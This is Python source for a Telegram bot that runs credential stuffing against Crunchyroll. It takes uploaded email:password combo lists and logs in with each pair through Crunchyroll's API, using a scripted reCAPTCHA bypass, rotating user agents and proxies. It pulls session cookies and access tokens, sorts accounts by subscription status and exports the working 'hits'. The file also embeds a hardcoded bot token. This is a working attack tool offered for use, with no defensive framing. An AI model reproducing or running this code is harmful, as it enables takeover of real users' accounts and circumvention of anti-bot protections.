import asyncio
import json
import sqlite3
import aiohttp
import random
import string
import logging
from datetime import datetime
from typing import Optional, Dict, Any
from dataclasses import dataclass
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# Configuration
BOT_TOKEN = "8237272070:AAG-jMJFqpS5H8BRhPWt7uQB8omQJeMbBdc"
ADMIN_IDS = [7935621079]  # Your Telegram ID
DB_PATH = "crunchyroll_checker.db"

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Database Setup
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Settings table
    c.execute('''CREATE TABLE IF NOT EXISTS settings
                 (key TEXT PRIMARY KEY, value TEXT)''')
    
    # Combos table
    c.execute('''CREATE TABLE IF NOT EXISTS combos
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  email TEXT,
                  password TEXT,
                  status TEXT DEFAULT 'unchecked',
                  result TEXT,
                  subscription TEXT,
                  checked_at TIMESTAMP,
                  proxy_used TEXT)''')
    
    # Stats table
    c.execute('''CREATE TABLE IF NOT EXISTS stats
                 (id INTEGER PRIMARY KEY,
                  total_checked INTEGER DEFAULT 0,
                  hits INTEGER DEFAULT 0,
                  frees INTEGER DEFAULT 0,
                  fails INTEGER DEFAULT 0,
                  last_check TIMESTAMP)''')
    
    # Insert default stats if not exists
    c.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
    
    conn.commit()
    conn.close()

init_db()

# States
class CheckerStates(StatesGroup):
    uploading_combos = State()
    setting_threads = State()
    adding_proxy = State()

# Data Models
@dataclass
class CheckResult:
    email: str
    password: str
    status: str  # HIT, FREE, FAIL, RETRY
    subscription: Optional[str] = None
    captured_data: Optional[Dict] = None
    error: Optional[str] = None

# Crunchyroll Checker Implementation
class CrunchyrollChecker:
    def __init__(self):
        self.ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ]
        
    def get_random_ua(self):
        return random.choice(self.ua_pool)
    
    def generate_trace_id(self):
        return ''.join(random.choices(string.hexdigits.lower(), k=16))
    
    async def solve_recaptcha(self, session: aiohttp.ClientSession) -> Optional[str]:
        """Replicates the SVB reCAPTCHA bypass logic"""
        try:
            # Anchor request
            anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk&co=aHR0cHM6Ly9zc28uY3J1bmNoeXJvbGwuY29tOjQ0Mw..&hl=en&v=qm3PSRIx10pekcnS9DjGnjPW&theme=dark&size=invisible"
            
            async with session.get(anchor_url) as resp:
                html = await resp.text()
                
            # Parse recaptcha-token
            start = html.find('id="recaptcha-token" value="') + len('id="recaptcha-token" value="')
            end = html.find('"', start)
            recaptcha_token = html[start:end]
            
            # Reload request
            reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk"
            payload = f"v=w0_qmZVSdobukXrBwYd9dTF7&reason=q&c={recaptcha_token}"
            
            async with session.post(reload_url, data=payload, headers={
                "Content-Type": "application/x-www-form-urlencoded"
            }) as resp:
                result = await resp.text()
                
            # Parse rresp
            start = result.find('"rresp","') + len('"rresp","')
            end = result.find('",', start)
            real_token = result[start:end]
            
            return real_token
        except Exception as e:
            logger.error(f"reCAPTCHA error: {e}")
            return None
    
    async def check_account(self, email: str, password: str, proxy: Optional[str] = None) -> CheckResult:
        connector = None
        if proxy:
            connector = aiohttp.ProxyConnector.from_url(proxy)
            
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                # Step 1: Get reCAPTCHA token
                recaptcha_token = await self.solve_recaptcha(session)
                if not recaptcha_token:
                    return CheckResult(email, password, "RETRY", error="Failed to get reCAPTCHA")
                
                # Step 2: Login request
                login_url = "https://sso.crunchyroll.com/api/login"
                payload = {
                    "email": email,
                    "password": password,
                    "recaptchaToken": recaptcha_token,
                    "eventSettings": {}
                }
                
                headers = {
                    "User-Agent": self.get_random_ua(),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": "https://sso.crunchyroll.com/login",
                    "Content-Type": "application/json",
                    "Origin": "https://sso.crunchyroll.com",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Traceparent": f"00-0000000000000000{self.generate_trace_id()}-19a065b737da764f-01"
                }
                
                async with session.post(login_url, json=payload, headers=headers) as resp:
                    response_text = await resp.text()
                    
                if "invalid_credentials" in response_text:
                    return CheckResult(email, password, "FAIL")
                
                # Step 3: Extract cookies
                cookies = session.cookie_jar.filter_cookies("https://sso.crunchyroll.com")
                device_id = cookies.get("device_id", {}).value if "device_id" in cookies else None
                etp_rt = cookies.get("etp_rt", {}).value if "etp_rt" in cookies else None
                cf_bm = cookies.get("__cf_bm", {}).value if "__cf_bm" in cookies else None
                
                if not device_id or not etp_rt:
                    return CheckResult(email, password, "RETRY", error="Missing cookies")
                
                # Step 4: Get Access Token
                token_url = "https://www.crunchyroll.com/auth/v1/token"
                token_payload = f"device_id={device_id}&device_type=Firefox%20on%20Windows&grant_type=etp_rt_cookie"
                
                token_headers = {
                    "Host": "www.crunchyroll.com",
                    "Cookie": f"device_id={device_id}; __cf_bm={cf_bm}; etp_rt={etp_rt}",
                    "User-Agent": self.get_random_ua(),
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6",
                    "Origin": "https://www.crunchyroll.com",
                    "Referer": "https://www.crunchyroll.com/discover"
                }
                
                async with session.post(token_url, data=token_payload, headers=token_headers) as resp:
                    token_response = await resp.text()
                    
                if "Just a moment..." in token_response:
                    return CheckResult(email, password, "RETRY", error="Cloudflare block")
                
                # Parse access token
                try:
                    token_data = json.loads(token_response)
                    access_token = token_data.get("access_token")
                except:
                    return CheckResult(email, password, "RETRY", error="Invalid token response")
                
                # Step 5: Get cr_exp and parse account ID
                www_cookies = session.cookie_jar.filter_cookies("https://www.crunchyroll.com")
                cr_exp = www_cookies.get("cr_exp", {}).value if "cr_exp" in www_cookies else None
                
                if cr_exp:
                    account_id = cr_exp[:36]  # First 36 chars as per SVB script
                else:
                    account_id = device_id[:36] if device_id else "unknown"
                
                # Step 6: Check Subscription
                subs_url = f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
                
                subs_headers = {
                    "Host": "www.crunchyroll.com",
                    "User-Agent": self.get_random_ua(),
                    "Accept": "application/json, text/plain, */*",
                    "Authorization": f"Bearer {access_token}",
                    "Referer": "https://www.crunchyroll.com/account/membership",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin"
                }
                
                async with session.get(subs_url, headers=subs_headers) as resp:
                    subs_response = await resp.text()
                
                # Check subscription status
                if '"subscriptions":[],' in subs_response or '"subscriptions":[]' in subs_response:
                    return CheckResult(email, password, "FREE", subscription="No active subscription")
                
                # Parse subscription details
                try:
                    subs_data = json.loads(subs_response)
                    subscriptions = subs_data.get("subscriptions", [])
                    
                    if subscriptions:
                        sub_info = subscriptions[0]
                        plan = sub_info.get("plan", "Unknown")
                        status = sub_info.get("status", "Unknown")
                        renewal = sub_info.get("next_renewal_date", "N/A")
                        
                        sub_details = f"Plan: {plan}\nStatus: {status}\nRenewal: {renewal}"
                        
                        return CheckResult(
                            email, password, "HIT", 
                            subscription=sub_details,
                            captured_data=subs_data
                        )
                    else:
                        return CheckResult(email, password, "FREE", subscription="No subscriptions found")
                        
                except json.JSONDecodeError:
                    return CheckResult(email, password, "HIT", subscription="Active (details parse error)")
                    
            except asyncio.TimeoutError:
                return CheckResult(email, password, "RETRY", error="Timeout")
            except Exception as e:
                logger.error(f"Check error: {e}")
                return CheckResult(email, password, "RETRY", error=str(e))

# UI Builders
class UIFactory:
    @staticmethod
    def main_menu(is_admin: bool = False) -> InlineKeyboardMarkup:
        buttons = [
            [
                InlineKeyboardButton(text="🚀 Start Checker", callback_data="start_check"),
                InlineKeyboardButton(text="📊 Statistics", callback_data="stats")
            ],
            [
                InlineKeyboardButton(text="📁 Manage Combos", callback_data="manage_combos"),
                InlineKeyboardButton(text="🌐 Proxies", callback_data="proxies")
            ],
            [
                InlineKeyboardButton(text="⚙️ Settings", callback_data="settings"),
                InlineKeyboardButton(text="📋 Logs", callback_data="logs")
            ]
        ]
        
        if is_admin:
            buttons.append([
                InlineKeyboardButton(text="🔧 Admin Panel", callback_data="admin_panel"),
                InlineKeyboardButton(text="☁️ Backup DB", callback_data="backup_db")
            ])
            
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    @staticmethod
    def checker_controls() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="⏸ Pause", callback_data="pause_check"),
                InlineKeyboardButton(text="🛑 Stop", callback_data="stop_check")
            ],
            [
                InlineKeyboardButton(text="📊 Live Stats", callback_data="live_stats"),
                InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
            ]
        ])
    
    @staticmethod
    def combo_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="📤 Upload Combos", callback_data="upload_combos"),
                InlineKeyboardButton(text="🗑 Clear All", callback_data="clear_combos")
            ],
            [
                InlineKeyboardButton(text="📥 Export Hits", callback_data="export_hits"),
                InlineKeyboardButton(text="📥 Export Frees", callback_data="export_frees")
            ],
            [
                InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
            ]
        ])
    
    @staticmethod
    def settings_menu() -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="👥 Workers", callback_data="set_workers"),
                InlineKeyboardButton(text="⏱ Timeout", callback_data="set_timeout")
            ],
            [
                InlineKeyboardButton(text="🔔 Notifications", callback_data="toggle_notifs"),
                InlineKeyboardButton(text="📝 Capture Format", callback_data="set_format")
            ],
            [
                InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
            ]
        ])

# Bot Initialization
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

checker = CrunchyrollChecker()
active_tasks = {}

# Helper Functions
def get_stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM stats WHERE id=1")
    stats = c.fetchone()
    conn.close()
    return stats

def update_stats(total=None, hits=None, frees=None, fails=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    updates = []
    if total is not None:
        updates.append(f"total_checked = total_checked + {total}")
    if hits is not None:
        updates.append(f"hits = hits + {hits}")
    if frees is not None:
        updates.append(f"frees = frees + {frees}")
    if fails is not None:
        updates.append(f"fails = fails + {fails}")
        
    if updates:
        query = f"UPDATE stats SET {', '.join(updates)}, last_check = CURRENT_TIMESTAMP WHERE id=1"
        c.execute(query)
        conn.commit()
    conn.close()

# Handlers
@router.message(Command("start"))
async def cmd_start(message: Message):
    is_admin = message.from_user.id in ADMIN_IDS
    welcome_text = """
🎌 *Welcome to CrunchyRoll Checker Bot*

This bot checks CrunchyRoll accounts using the SilverBullet method with:
• Advanced reCAPTCHA bypass
• Proxy support
• Real-time statistics
• Beautiful dashboard UI

Use the menu below to navigate:
    """
    await message.answer(
        welcome_text, 
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.main_menu(is_admin)
    )

@router.callback_query(F.data == "main_menu")
async def back_to_menu(callback: CallbackQuery):
    is_admin = callback.from_user.id in ADMIN_IDS
    await callback.message.edit_text(
        "🎌 *CrunchyRoll Checker - Main Menu*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.main_menu(is_admin)
    )

@router.callback_query(F.data == "stats")
async def show_stats(callback: CallbackQuery):
    stats = get_stats()
    if stats:
        _, total, hits, frees, fails, last_check = stats
        
        stats_text = f"""
📊 *Checker Statistics*

🔢 Total Checked: `{total}`
✅ Hits: `{hits}`
🆓 Frees: `{frees}`
❌ Fails: `{fails}`
📅 Last Check: `{last_check or "Never"}`

📈 Success Rate: `{((hits+frees)/total*100 if total > 0 else 0):.2f}%`
        """
        
        await callback.message.edit_text(
            stats_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔄 Refresh", callback_data="stats"),
                InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
            ]])
        )

@router.callback_query(F.data == "manage_combos")
async def manage_combos(callback: CallbackQuery):
    await callback.message.edit_text(
        "📁 *Combo Management*\n\nUpload combo lists or manage existing ones.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.combo_menu()
    )

@router.callback_query(F.data == "upload_combos")
async def request_combos(callback: CallbackQuery, state: FSMContext):
    await state.set_state(CheckerStates.uploading_combos)
    await callback.message.edit_text(
        "📤 *Upload Combos*\n\nSend me a text file with combos in format:\n`email:password`\nor\n`email|password`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔙 Cancel", callback_data="manage_combos")
        ]])
    )

@router.message(CheckerStates.uploading_combos, F.document)
async def process_combos(message: Message, state: FSMContext):
    if not message.document.file_name.endswith('.txt'):
        await message.answer("❌ Please upload a .txt file")
        return
        
    file = await bot.get_file(message.document.file_id)
    content = await bot.download_file(file.file_path)
    content_str = content.read().decode('utf-8', errors='ignore')
    
    combos = []
    for line in content_str.strip().split('\n'):
        line = line.strip()
        if ':' in line:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
        elif '|' in line:
            email, pwd = line.split('|', 1)
            combos.append((email.strip(), pwd.strip()))
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executemany("INSERT INTO combos (email, password) VALUES (?, ?)", combos)
    conn.commit()
    conn.close()
    
    await state.clear()
    await message.answer(
        f"✅ *Loaded {len(combos)} combos*\n\nReady to check!",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🚀 Start Now", callback_data="start_check"),
            InlineKeyboardButton(text="🔙 Menu", callback_data="main_menu")
        ]])
    )

@router.callback_query(F.data == "start_check")
async def start_checker(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, email, password FROM combos WHERE status='unchecked' LIMIT 100")
    combos = c.fetchall()
    conn.close()
    
    if not combos:
        await callback.answer("No unchecked combos found!", show_alert=True)
        return
    
    msg = await callback.message.edit_text(
        "🚀 *Checker Started*\n\n"
        f"📋 Checking `{len(combos)}` accounts...\n"
        "⏳ Progress: `0%`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.checker_controls()
    )
    
    # Start checking task
    task = asyncio.create_task(
        run_checker(combos, msg, user_id)
    )
    active_tasks[user_id] = task

async def run_checker(combos, message, user_id):
    total = len(combos)
    hits = 0
    frees = 0
    fails = 0
    
    for idx, (combo_id, email, password) in enumerate(combos, 1):
        if user_id not in active_tasks:
            break  # Stopped
            
        result = await checker.check_account(email, password)
        
        # Update database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        if result.status == "HIT":
            c.execute("""UPDATE combos SET status=?, result=?, subscription=?, checked_at=CURRENT_TIMESTAMP 
                        WHERE id=?""", ("HIT", json.dumps(result.captured_data), result.subscription, combo_id))
            hits += 1
        elif result.status == "FREE":
            c.execute("""UPDATE combos SET status=?, result=?, checked_at=CURRENT_TIMESTAMP 
                        WHERE id=?""", ("FREE", "No subscription", combo_id))
            frees += 1
        elif result.status == "FAIL":
            c.execute("""UPDATE combos SET status=?, checked_at=CURRENT_TIMESTAMP 
                        WHERE id=?""", ("FAIL", combo_id))
            fails += 1
        else:  # RETRY
            c.execute("""UPDATE combos SET status='unchecked', checked_at=CURRENT_TIMESTAMP 
                        WHERE id=?""", (combo_id,))
            
        conn.commit()
        conn.close()
        
        # Update stats
        update_stats(total=1, hits=1 if result.status=="HIT" else 0, 
                    frees=1 if result.status=="FREE" else 0, 
                    fails=1 if result.status=="FAIL" else 0)
        
        # Update message every 5 checks or on hit
        if idx % 5 == 0 or result.status in ["HIT", "FREE"]:
            progress = (idx / total) * 100
            status_emoji = "🟢" if result.status == "HIT" else "🟡" if result.status == "FREE" else "🔴"
            
            try:
                await message.edit_text(
                    f"🚀 *Checking...* {status_emoji}\n\n"
                    f"📋 Progress: `{idx}/{total}` (`{progress:.1f}%`)\n"
                    f"✅ Hits: `{hits}` | 🆓 Frees: `{frees}` | ❌ Fails: `{fails}`\n"
                    f"👤 Current: `{email}`",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=UIFactory.checker_controls()
                )
            except:
                pass
                
        await asyncio.sleep(1)  # Rate limiting
    
    # Final update
    if user_id in active_tasks:
        del active_tasks[user_id]
        
    await message.edit_text(
        f"✅ *Check Complete!*\n\n"
        f"📋 Total: `{total}`\n"
        f"✅ Hits: `{hits}`\n"
        f"🆓 Frees: `{frees}`\n"
        f"❌ Fails: `{fails}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="📥 Export Results", callback_data="export_results"),
            InlineKeyboardButton(text="🔙 Menu", callback_data="main_menu")
        ]])
    )

@router.callback_query(F.data == "stop_check")
async def stop_check(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
        del active_tasks[user_id]
        await callback.answer("Checker stopped!", show_alert=True)
    else:
        await callback.answer("No active checker!", show_alert=True)

@router.callback_query(F.data == "export_hits")
async def export_hits(callback: CallbackQuery):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT email, password, subscription FROM combos WHERE status='HIT'")
    hits = c.fetchall()
    conn.close()
    
    if not hits:
        await callback.answer("No hits to export!", show_alert=True)
        return
    
    content = ""
    for email, pwd, sub in hits:
        content += f"{email}:{pwd} | {sub}\n"
    
    file = BufferedInputFile(content.encode(), filename="hits.txt")
    await callback.message.answer_document(file, caption="✅ *Hits Export*", parse_mode=ParseMode.MARKDOWN)

@router.callback_query(F.data == "settings")
async def settings(callback: CallbackQuery):
    await callback.message.edit_text(
        "⚙️ *Settings*\n\nConfigure your checker preferences:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=UIFactory.settings_menu()
    )

@router.callback_query(F.data == "logs")
async def show_logs(callback: CallbackQuery):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""SELECT email, status, subscription, checked_at FROM combos 
                 WHERE status IN ('HIT', 'FREE') ORDER BY checked_at DESC LIMIT 10""")
    recent = c.fetchall()
    conn.close()
    
    text = "📋 *Recent Checks*\n\n"
    for email, status, sub, time in recent:
        emoji = "✅" if status == "HIT" else "🆓"
        text += f"{emoji} `{email}`\n"
        text += f"   Status: {status} | {time}\n"
        if sub:
            text += f"   Info: {sub[:50]}...\n"
        text += "\n"
    
    await callback.message.edit_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🗑 Clear Logs", callback_data="clear_logs"),
            InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
        ]])
    )

# Admin Panel
@router.callback_query(F.data == "admin_panel")
async def admin_panel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("Unauthorized!", show_alert=True)
        return
        
    await callback.message.edit_text(
        "🔧 *Admin Panel*\n\nRestricted access features:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🗑 Reset Stats", callback_data="reset_stats"),
                InlineKeyboardButton(text="🗑 Clear DB", callback_data="clear_db")
            ],
            [
                InlineKeyboardButton(text="📢 Broadcast", callback_data="broadcast"),
                InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")
            ]
        ])
    )

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
